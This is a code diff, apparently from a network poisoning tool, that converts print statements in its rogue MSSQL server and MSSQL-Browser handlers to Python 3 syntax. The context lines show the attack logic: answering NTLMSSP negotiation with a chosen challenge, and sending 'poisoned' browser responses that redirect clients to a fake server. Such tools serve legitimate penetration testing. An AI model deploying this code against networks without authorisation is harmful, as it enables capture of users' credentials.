@@ -128,7 +128,7 @@ class MSSQL(BaseRequestHandler):
         try:
             data = self.request.recv(1024)
             if settings.Config.Verbose:
-                print text("[MSSQL] Received connection from %s" % self.client_address[0])
+                print(text("[MSSQL] Received connection from %s" % self.client_address[0]))
 
             if data[0] == "\x12":  # Pre-Login Message
                 Buffer = str(MSSQLPreLoginAnswer())
@@ -137,7 +137,7 @@ class MSSQL(BaseRequestHandler):
 
             if data[0] == "\x10":  # NegoSSP
                 if re.search("NTLMSSP",data):
-                                        Challenge = RandomChallenge()
+                    Challenge = RandomChallenge()
                     Packet = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
                     Packet.calculate()
                     Buffer = str(Packet)
@@ -157,7 +157,7 @@ class MSSQL(BaseRequestHandler):
 class MSSQLBrowser(BaseRequestHandler):
     def handle(self):
         if settings.Config.Verbose:
-            print text("[MSSQL-BROWSER] Received request from %s" % self.client_address[0])
+            print(text("[MSSQL-BROWSER] Received request from %s" % self.client_address[0]))
 
         data, soc = self.request
 
@@ -170,13 +170,13 @@ class MSSQLBrowser(BaseRequestHandler):
                 self.send_dac_response(soc)
 
     def send_response(self, soc, inst):
-        print text("[MSSQL-BROWSER] Sending poisoned response to %s" % self.client_address[0])
+        print(text("[MSSQL-BROWSER] Sending poisoned response to %s" % self.client_address[0]))
 
         server_name = ''.join(chr(random.randint(ord('A'), ord('Z'))) for _ in range(random.randint(12, 20)))
         resp = "ServerName;%s;InstanceName;%s;IsClustered;No;Version;12.00.4100.00;tcp;1433;;" % (server_name, inst)
         soc.sendto(struct.pack("<BH", 0x05, len(resp)) + resp, self.client_address)
 
     def send_dac_response(self, soc):
-        print text("[MSSQL-BROWSER] Sending poisoned DAC response to %s" % self.client_address[0])
+        print(text("[MSSQL-BROWSER] Sending poisoned DAC response to %s" % self.client_address[0]))
 
         soc.sendto(struct.pack("<BHBH", 0x05, 0x06, 0x01, 1433), self.client_address)
